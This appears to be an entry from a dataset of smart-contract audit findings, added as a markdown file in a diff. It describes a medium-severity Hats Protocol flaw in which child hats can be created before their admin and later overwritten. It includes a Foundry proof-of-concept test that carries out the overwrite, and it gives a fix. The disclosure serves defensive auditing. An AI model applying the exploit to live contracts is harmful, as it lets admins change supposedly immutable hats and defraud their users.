@@ -1,0 +1,83 @@
+# [M] Hats can be overwritten
+
+## Summary
+Severity: Medium
+Contest weight: 0.6910
+Dataset id: 19763
+Source: https://huggingface.co/datasets/Zaevlad/audit-findings-dataset
+Type: audit-finding
+
+## Details
+Child hats can be created under a non-existent admin. Creating the admin allows overwriting the properties of the child-hats, which goes against the immutability of hats.
+When creating a hat, the code never checks if the admin passed actually exists or not. Thus it allows the creation of a hat under an admin who hasn't been created yet. Lets say top hat is 1.0.0, and we call admin the hat 1.1.0 and child is hat 1.1.1.
+The child can be created before admin. When admin (1.1.0) is created after this, it overwrites the lastHatId of the admin, as shown here https://github.com/Hats-Protocol/hats-protocol/blob/fafcfdf046c0369c1f9e077eacd94a328f9d7af0/src/Hats.sol#L421-L439
+```solidity
+function _createHat(
+    uint256 _id,
+    string calldata _details,
+    uint32 _maxSupply,
+    address _eligibility,
+    address _toggle,
+    bool _mutable,
+    string calldata _imageURI
+) internal returns (Hat memory hat) {
+    hat.details = _details;
+    hat.maxSupply = _maxSupply;
+    hat.eligibility = _eligibility;
+    hat.toggle = _toggle;
+    hat.imageURI = _imageURI;
+    hat.config = _mutable ? uint96(3 << 94) : uint96(1 << 95);
+    _hats[_id] = hat;
+    emit HatCreated(_id, _details, _maxSupply, _eligibility, _toggle, _mutable, _imageURI);
+}
+```
+Now, the next eligible hat for admin is 1.1.1, which is a hat that was already created and minted. This can allow the admin to change the properties of the child, even if the child hat was previously immutable. This contradicts the immutability of hats, and can be used to rug users in multiple ways, and is thus classified as high severity. This attack can be carried out by any hat wearer on their child tree, mutating their properties.
+The attack can be demonstrated with the following code which carries out the following steps:
+1. Child 1.1.1 is created with max supply 10, and false mutability. Thus its properties should be locked.
+2. Admin 1.1.0 is created
+3. Child 1.1.1 is re-created, now with supply of 20, overwriting its previous instance
+4. The children are shown to be on the same hatId, and their max supplies are shown to be different values.
+```solidity
+function testATTACKoverwrite() public {
+    vm.startPrank(address(topHatWearer));
+    uint256 emptyAdmin = hats.getNextId(topHatId);
+    uint256 child1 = hats.createHat(
+        emptyAdmin,
+        _details,
+        10,
+        _eligibility,
+        _toggle,
+        false,
+        secondHatImageURI
+    );
+    (, uint256 maxsup, , , , , , , ) = hats.viewHat(child1);
+    assertEq(maxsup, 10);
+    hats.createHat(
+        topHatId,
+        _details,
+        _maxSupply,
+        _eligibility,
+        _toggle,
+        false,
+        secondHatImageURI
+    );
+    uint256 child2 = hats.createHat(
+        emptyAdmin,
+        _details,
+        20,
+        _eligibility,
+        _toggle,
+        false,
+        secondHatImageURI
+    );
+    (, maxsup, , , , , , , ) = hats.viewHat(child1);
+    assertEq(child1, child2);
+    assertEq(maxsup, 20);
+}
+```
+
+## Recommendation
+Check if admin exists, before minting by checking any of its properties default values
+```solidity
+require(_hats[admin].maxSupply > 0, "Admin not created");
+```
